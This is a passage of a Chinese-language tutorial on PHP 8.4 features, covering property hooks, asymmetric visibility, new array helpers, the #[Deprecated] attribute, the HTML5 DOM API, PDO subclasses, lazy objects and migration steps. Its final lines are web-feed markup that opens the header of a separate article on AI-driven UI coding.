<p>PHP 允许在提升的属性上使用 hook，但有一个重要规则：传给构造函数的值必须匹配属性声明的类型——不管你的 set hook 可能接受什么。</p>
<p>也就是说你可以写：</p>
<ul>
<li>属性类型：<code>DateTimeInterface</code></li>
<li>set hook 接受：<code>string|DateTimeInterface</code></li>
</ul>
<p>…但如果你用提升，构造函数参数类型仍然是 <code>DateTimeInterface</code>。</p>
<p>如果你真的想"构造函数里也允许 string"，你可能需要工厂或非提升的构造函数参数。</p>
<h4 data-id="heading-7">重要限制：property hooks 不能和 readonly 一起用</h4>
<p>这对喜欢不可变对象的团队很重要。</p>
<p>手册明确说明：property hooks 与 readonly 属性不兼容。</p>
<p>所以如果你的风格是"到处都是不可变值对象"，hooks 不能替代那个。Hooks 更适合的场景是：</p>
<ul>
<li>DTO 和 request/response 对象</li>
<li>配置对象</li>
<li>内部可变但需要护栏的领域对象</li>
</ul>
<p>（下一节会讲用非对称可见性实现"半不可变 DTO"。）</p>
<h4 data-id="heading-8">另一个限制：引用和间接修改可能坑你</h4>
<p>Hooks 拦截读写，这可能与引用冲突——特别是数组元素写入：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$obj</span>-&gt;arr[<span class="hljs-string">'k'</span>] = <span class="hljs-string">'v'</span>;
</code></pre>
<p>文档警告说，获取引用或间接修改可能绕过 set hook，并概述了约束（如 <code>&amp;get</code> 行为）和允许的情况。</p>
<p>实用指南：</p>
<ul>
<li>如果调用者经常修改元素，避免在数组属性上用 hook。</li>
<li>优先用"替换整个数组"模式（<code>$obj-&gt;tags = [...$obj-&gt;tags, $newTag];</code>），这表现得像普通 set。</li>
</ul>
<h4 data-id="heading-9">什么时候不应该用 property hooks</h4>
<p>Hooks 很棒……直到它们不是。在以下情况避免：</p>
<ul>
<li>"hook body"开始做真正的编排（IO、网络调用、日志）。</li>
<li>调试变得不清晰（"为什么读这个属性会访问数据库？"）。</li>
<li>你的团队需要关键行为有显式的调用点。</li>
</ul>
<p>一个有用的规则：property hooks 最适合实现<strong>局部不变量和局部转换</strong>——真正属于属性本身的逻辑。</p>
<h3 data-id="heading-10">其他影响日常工作的 PHP 8.4 特性（挑你真正会用的）</h3>
<p>PHP 8.4 不只有 hooks。专注于以下类型的特性：</p>
<ul>
<li>减少样板代码，</li>
<li>减少 bug，</li>
<li>或让代码更容易理解。</li>
</ul>
<h4 data-id="heading-11">特性：非对称属性可见性（public 读、受限写）</h4>
<p>非对称可见性让你可以为读和写设置不同的可见性。</p>
<p>示例：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Money</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">private</span>(<span class="hljs-params">set</span>) <span class="hljs-keyword">string</span> <span class="hljs-variable">$currency</span>,
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">private</span>(<span class="hljs-params">set</span>) <span class="hljs-keyword">int</span> <span class="hljs-variable">$cents</span>,
    </span>) </span>{}
}
</code></pre>
<p>调用者可以读：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">echo</span> <span class="hljs-variable">$m</span>-&gt;cents;
</code></pre>
<p>但不能写：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$m</span>-&gt;cents = <span class="hljs-number">500</span>; <span class="hljs-comment">// Error outside the class</span>
</code></pre>
<p>迁移指南阐明了规则：第一个可见性是 get-visibility，第二个控制 set-visibility，get visibility 不能比 set visibility 更窄。</p>
<p>这对 DTO 很重要：它给你一种"大部分不可变"的风格，而不必采用完整的值对象方法。</p>
<h4 data-id="heading-12">组合非对称可见性 + property hooks</h4>
<p>这个组合经常替代经典的"私有属性 + getter + setter"。</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInput</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">private</span>(set) <span class="hljs-keyword">string</span> <span class="hljs-variable">$email</span> {
        set =&gt; <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$value</span>));
    }
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">private</span>(set) <span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span> {
        set {
            <span class="hljs-variable">$v</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$value</span>);
            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$v</span> === <span class="hljs-string">''</span>) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">InvalidArgumentException</span>(<span class="hljs-string">'Name is required.'</span>);
            }
            <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$v</span>;
        }
    }
}
</code></pre>
<ul>
<li>读是 public（对模板、序列化器、调试友好）</li>
<li>写是受控的（对不变量友好）</li>
<li>样板代码保持低</li>
</ul>
<h4 data-id="heading-13">特性：新数组辅助函数（array_find、array_find_key、array_any、array_all）</h4>
<p>PHP 8.4 新增了数组搜索/检查函数。</p>
<p><strong>array_find 和 array_find_key</strong></p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$users</span> = [
    [<span class="hljs-string">'id'</span> =&gt; <span class="hljs-number">1</span>, <span class="hljs-string">'active'</span> =&gt; <span class="hljs-literal">false</span>],
    [<span class="hljs-string">'id'</span> =&gt; <span class="hljs-number">2</span>, <span class="hljs-string">'active'</span> =&gt; <span class="hljs-literal">true</span>],
    [<span class="hljs-string">'id'</span> =&gt; <span class="hljs-number">3</span>, <span class="hljs-string">'active'</span> =&gt; <span class="hljs-literal">false</span>],
];

<span class="hljs-variable">$first</span> = <span class="hljs-title function_ invoke__">array_find</span>(<span class="hljs-variable">$users</span>, fn (<span class="hljs-variable">$u</span>) =&gt; <span class="hljs-variable">$u</span>[<span class="hljs-string">'active'</span>] === <span class="hljs-literal">true</span>);
<span class="hljs-comment">// ['id' =&gt; 2, 'active' =&gt; true]</span>
</code></pre>
<p>如果没找到，返回 <code>null</code>——但如果<strong>值本身</strong>就是 <code>null</code>，你怎么区分"找到 null"和"没找到"？</p>
<p>你可以用 <code>array_find_key()</code> 来避免歧义（因为 key 不能是 null）。</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">array_find_key</span>(<span class="hljs-variable">$users</span>, fn (<span class="hljs-variable">$u</span>) =&gt; <span class="hljs-variable">$u</span>[<span class="hljs-string">'active'</span>] === <span class="hljs-literal">true</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$key</span> === <span class="hljs-literal">null</span>) {
    <span class="hljs-comment">// 真的没找到</span>
}
<span class="hljs-variable">$firstActive</span> = <span class="hljs-variable">$users</span>[<span class="hljs-variable">$key</span>];
</code></pre>
<p><strong>array_any 和 array_all 看起来简单——直到它们消除了噪音</strong></p>
<p>例如：强制所有上传的文件都在大小限制内。</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$ok</span> = <span class="hljs-title function_ invoke__">array_all</span>(<span class="hljs-variable">$files</span>, fn (<span class="hljs-variable">$f</span>) =&gt; <span class="hljs-variable">$f</span>[<span class="hljs-string">'size'</span>] &lt;= <span class="hljs-number">5_000_000</span>);
<span class="hljs-keyword">if</span> (!<span class="hljs-variable">$ok</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">'One or more files are too large.'</span>);
}
</code></pre>
<p>这替代了每个人都写得略有不同的 foreach + 标志变量。</p>
<h4 data-id="heading-14">特性：#[Deprecated] attribute 用于用户态弃用</h4>
<p>PHP 一直有内部弃用机制，但 PHP 8.4 通过 <code>#[Deprecated]</code> attribute 暴露了一个干净的用户态版本。</p>
<p>手册说：使用已弃用的功能会触发 <code>E_USER_DEPRECATED</code>。</p>
<p>示例：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">#[\Deprecated</span>(<span class="hljs-attr">message</span>: <span class="hljs-string">"Use slugify() instead"</span>, <span class="hljs-attr">since</span>: <span class="hljs-string">"2026-01"</span>)<span class="hljs-meta">]</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">make_slug</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$s</span></span>): <span class="hljs-title">string</span>
</span>{
    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$s</span>));
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">slugify</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$s</span></span>): <span class="hljs-title">string</span>
</span>{
    <span class="hljs-comment">// 真正的实现</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$s</span>));
}

<span class="hljs-title function_ invoke__">make_slug</span>(<span class="hljs-string">"Hello World"</span>);
</code></pre>
<p>这对团队来说被低估了：它给你一个标准化的方式来：</p>
<ul>
<li>标记旧的辅助函数，</li>
<li>指导内部迁移，</li>
<li>在 CI 日志中暴露弃用使用情况。</li>
</ul>
<h4 data-id="heading-15">特性：支持 HTML5 的新 DOM API（在 Dom 命名空间中）</h4>
<p>如果你在 PHP 中解析过 HTML（爬取、清理、迁移脚本），PHP 8.4 是一次有意义的升级。</p>
<p>8.4 发布公告介绍了带有标准兼容 HTML5 解析的新 DOM API、Dom 命名空间中的新类，以及方便的查询辅助函数。</p>
<p>公告中的示例展示了：</p>
<ul>
<li><code>Dom\HTMLDocument::createFromString(...)</code></li>
<li><code>querySelector(...)</code></li>
<li><code>classList-&gt;contains(...)</code></li>
</ul>
<p>一个实际用例：安全地检测"canonical"链接标签。</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$doc</span> = <span class="hljs-title class_">Dom\HTMLDocument</span>::<span class="hljs-title function_ invoke__">createFromString</span>(<span class="hljs-variable">$html</span>, LIBXML_NOERROR);
<span class="hljs-variable">$canonical</span> = <span class="hljs-variable">$doc</span>-&gt;<span class="hljs-title function_ invoke__">querySelector</span>(<span class="hljs-string">'link[rel="canonical"]'</span>);
<span class="hljs-variable">$url</span> = <span class="hljs-variable">$canonical</span>?-&gt;<span class="hljs-title function_ invoke__">getAttribute</span>(<span class="hljs-string">'href'</span>);
</code></pre>
<p>对于简单任务，这比经典的 DOMDocument + DOMXPath 组合好用得多，它减少了没人想维护的"XPath 意大利面"脚本。</p>
<h4 data-id="heading-16">特性：PDO 驱动特定子类（更精确的 API）</h4>
<p>PHP 8.4 引入了驱动特定的 PDO 子类，如 <code>Pdo\MySql</code>、<code>Pdo\Pgsql</code>、<code>Pdo\Sqlite</code> 等，并在发布公告中展示了新的连接风格。</p>
<p>在 PHP 8.4 示例中：</p>
<ul>
<li><code>PDO::connect(...)</code> 返回 <code>Pdo\Sqlite</code></li>
<li>驱动特定方法只存在于相关的地方</li>
</ul>
<p>这改善了正确性和 IDE 支持，特别是在测试和生产混用不同驱动的代码库中。</p>
<h4 data-id="heading-17">附加：Lazy objects（主要用于框架和基础设施代码）</h4>
<p>PHP 8.4 还引入了 lazy objects 概念：初始化被延迟到访问时才进行的对象。迁移指南明确指出框架可以利用它们来延迟获取依赖或数据。</p>
<p>它甚至展示了使用 <code>ReflectionClass::newLazyGhost(...)</code> 的核心机制。</p>
<p>这不是你在日常应用代码中会天天用的东西，但如果你做：</p>
<ul>
<li>DI 容器，</li>
<li>ORM，</li>
<li>代理层，</li>
<li>或对性能敏感的 bootstrap，</li>
</ul>
<p>…值得知道它的存在，因为你会在生态系统内部看到它。</p>
<h3 data-id="heading-18">PHP 8.4 如何改变 OOP 风格（尤其是 DTO）</h3>
<p>如果你写 PHP 很多年，你可能经历过至少三种 DTO 风格：</p>
<ol>
<li>"到处都是 public 属性"</li>
<li>"所有东西都是私有属性 + getter/setter"</li>
<li>"readonly 提升属性"（好用，但死板）</li>
</ol>
<p>PHP 8.4 增加了第四种，非常实用：</p>
<ul>
<li>public 读，</li>
<li>受控写，</li>
<li>不变量靠近数据。</li>
</ul>
<h4 data-id="heading-19">8.4 之前：常见的 DTO 样板代码</h4>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CreateUserCommand</span>
</span>{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$email</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$email</span>, <span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span></span>)
    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;email = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$email</span>));
        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$name</span>);
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;name === <span class="hljs-string">''</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">InvalidArgumentException</span>(<span class="hljs-string">'Name is required.'</span>);
        }
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">email</span>(<span class="hljs-params"/>): <span class="hljs-title">string</span> </span>{ <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;email; }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">name</span>(<span class="hljs-params"/>): <span class="hljs-title">string</span> </span>{ <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;name; }
}
</code></pre>
<p>没什么问题。只是重复，特别是在几十个消息对象上。</p>
<h4 data-id="heading-20">8.4 之后："public 读 + private 写 + hooks"</h4>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CreateUserCommand</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">private</span>(set) <span class="hljs-keyword">string</span> <span class="hljs-variable">$email</span> {
        set =&gt; <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$value</span>));
    }
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">private</span>(set) <span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span> {
        set {
            <span class="hljs-variable">$v</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$value</span>);
            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$v</span> === <span class="hljs-string">''</span>) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">InvalidArgumentException</span>(<span class="hljs-string">'Name is required.'</span>);
            }
            <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$v</span>;
        }
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$email</span>, <span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span></span>)
    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;email = <span class="hljs-variable">$email</span>;
        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;
    }
}
</code></pre>
<p>你得到：</p>
<ul>
<li>强类型</li>
<li>集中化的规范化/验证</li>
<li>Public 可读性（在模板、日志、序列化器中方便）</li>
<li>没有访问器样板</li>
</ul>
<p>而且你仍然可以用测试保持严格。</p>
<h4 data-id="heading-21">一个现实的"DTO + 派生属性"模式</h4>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Address</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">private</span>(<span class="hljs-params">set</span>) <span class="hljs-keyword">string</span> <span class="hljs-variable">$line1</span>,
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">private</span>(<span class="hljs-params">set</span>) ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$line2</span>,
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">private</span>(<span class="hljs-params">set</span>) <span class="hljs-keyword">string</span> <span class="hljs-variable">$city</span>,
    </span>) </span>{}
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$singleLine</span> {
        get =&gt; <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$this</span>-&gt;line1 . <span class="hljs-string">' '</span> . (<span class="hljs-variable">$this</span>-&gt;line2 ?? <span class="hljs-string">''</span>) . <span class="hljs-string">', '</span> . <span class="hljs-variable language_">$this</span>-&gt;city);
    }
}
</code></pre>
<p>你可以保持存储字段干净，并提供一个友好的派生字段而不引入额外方法。</p>
<h4 data-id="heading-22">readonly 仍然胜出的场景</h4>
<p>因为 hooks 不能和 readonly 一起用，不可变值对象仍然依赖：</p>
<ul>
<li>readonly 提升属性</li>
<li>工厂</li>
<li>显式的 <code>withX()</code> 方法（在 PHP 8.5 里更好用了，但那是另一篇文章的事）</li>
</ul>
<p>所以很多团队的实际分工是：</p>
<ul>
<li><strong>值对象</strong>：readonly + 显式行为</li>
<li><strong>DTO / 命令 / 请求</strong>：非对称可见性 + hooks</li>
</ul>
<h3 data-id="heading-23">经常影响测试/CI 的简短兼容性说明</h3>
<p>这一节故意简短，但是能省时间的那种简短。</p>
<h4 data-id="heading-24">错误报告级别：E_STRICT 没了</h4>
<p>PHP 8.4 移除了 E_STRICT 错误级别，E_STRICT 常量已弃用。</p>
<p>如果你有遗留代码或配置引用了 E_STRICT，可能会看到 CI 行为变化。</p>
<h4 data-id="heading-25">JIT 配置默认值变了（OPcache）</h4>
<p>PHP 8.4 中 JIT 配置的默认值变了：</p>
<ul>
<li>从 <code>opcache.jit=tracing</code> 和 <code>opcache.jit_buffer_size=0</code></li>
<li>到 <code>opcache.jit=disable</code> 和 <code>opcache.jit_buffer_size=64M</code></li>
</ul>
<p>这不会改变"JIT 默认关闭"，但可能影响之前只切换其中一个值的环境。</p>
<h4 data-id="heading-26">一些扩展变得更严格（类型化常量、ValueError、行为变更）</h4>
<p>8.4 不兼容列表中的一些例子：</p>
<ul>
<li>几个扩展类常量现在有类型（Date、Intl、PDO、Reflection、SPL、Sqlite、XMLReader）。</li>
<li>一些函数现在抛 ValueError 而不是静默接受无效输入（如 <code>round()</code> 无效模式、<code>str_getcsv()</code> 无效分隔符长度）。</li>
<li>SimpleXML 迭代行为变了以避免意外的 rewind（之前可能导致无限循环）。</li>
<li>根据驱动，一些 PDO 属性现在表现为布尔而非整数。</li>
</ul>
<p>这些是那种除非你尽早在 8.4 下运行测试套件，否则会表现为"随机测试失败"的变更。</p>
<h3 data-id="heading-27">小型迁移：采用 PHP 8.4 的小步骤，无需大重构</h3>
<p>如果你还没上 8.4——或者上了但没用这些特性——这是一个通常有效的安全顺序。</p>
<h4 data-id="heading-28">步骤 1：先把 8.4 加到 CI，即使生产还没准备好</h4>
<p>确保你能在 8.4 上运行测试套件而不出意外。把警告和弃用当作信号。</p>
<h4 data-id="heading-29">步骤 2：只在新代码中采用 array_find / array_any / array_all</h4>
<p>不要重构整个代码库。只是不要再写新的"foreach-with-break"循环，除非它们真的更清晰。</p>
<h4 data-id="heading-30">步骤 3：对新的 DTO 和请求对象使用非对称可见性</h4>
<p>这是低风险的：你主要是改变属性声明并消除一类意外修改。</p>
<h4 data-id="heading-31">步骤 4：在明显替代样板代码的地方添加 property hooks</h4>
<p>从以下开始：</p>
<ul>
<li>trim 和大小写规范化，</li>
<li>简单验证，</li>
<li>派生属性。</li>
</ul>
<p>一开始避免在 hooks 里放重逻辑。</p>
<h4 data-id="heading-32">步骤 5：用 #[Deprecated] 进行内部 API 清理</h4>
<p>用清晰的消息标记旧方法和辅助函数。在 CI 日志中跟踪使用情况。让弃用可操作。</p>
<h4 data-id="heading-33">步骤 6：只在脚本或隔离模块中采用新 DOM API</h4>
<p>如果你的应用做 HTML 解析，新 API 可能是很大的改进——但一开始保持采用范围受限。</p>
<h4 data-id="heading-34">步骤 7：把 lazy objects 留给框架/基础设施层</h4>
<p>知道这个特性存在。不要强行塞进应用代码，除非你有非常具体的性能或架构原因。</p>
<h3 data-id="heading-35">通往 PHP 8.5 的桥梁（为什么 8.4 让下一步更容易）</h3>
<p>一旦你的团队熟悉了 PHP 8.4 的"现代基线"：</p>
<ul>
<li>DTO 因为非对称可见性 + hooks 变得更干净</li>
<li>弃用策略因为 <code>#[Deprecated]</code> 变得更系统化</li>
<li>数组重型代码可以用原生辅助函数表达得更清晰</li>
<li>HTML 解析和工具脚本变得不那么痛苦</li>
</ul>
<p>这个基线减少了迁移到 PHP 8.5 的摩擦，因为你已经现代化了代码库中对象和日常工具的写法。PHP 8.5 就不再是"追赶"，而是选择性地采用改进。</p>
<h3 data-id="heading-36">结论</h3>
<p>PHP 8.4 不是一个"跳过它，直接上 8.5"的版本。在 2026 年，它仍然是一个明智的基线，因为它受支持、广泛相关，而且它改变了日常 PHP 的人体工学——尤其是在 OOP 密集的代码库中。</p>
<p>如果你从这篇回顾中只带走一件事，那就是 property hooks——但要带着意图使用：</p>
<ul>
<li>用它们做不变量、规范化和干净的派生值，</li>
<li>把它们和非对称可见性配对做实用的 DTO，</li>
<li>让 hooks 保持无聊（往好的方向）。</li>
</ul>
<p>这个组合让你今天就有更干净的 8.4 代码库——以及准备好时通往 8.5 的更平滑路径。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深度实践：Spec-Coding，AI 独立完成复杂 UI 开发的可行性方案]]></title>    <link>https://juejin.cn/post/7594389431835541545</link>    <guid>https://juejin.cn/post/7594389431835541545</guid>    <pubDate>2026-01-13T03:51:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594389431835541545" data-draft-id="7594420277448785947" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深度实践：Spec-Coding，AI 独立完成复杂 UI 开发的可行性方案"/> <meta itemprop="keywords" content="前端,AI编程,VibeCoding"/> <meta itemprop="datePublished" content="2026-01-13T03:51:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="猪猪拆迁队"/> <meta itemprop="url" content="https://juejin.cn/user/2541726613638973"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深度实践：Spec-Coding，AI 独立完成复杂 UI 开发的可行性方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2541726613638973/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    猪猪拆迁队
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T03:51:02.000Z" title="Tue Jan 13 2026 03:51:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 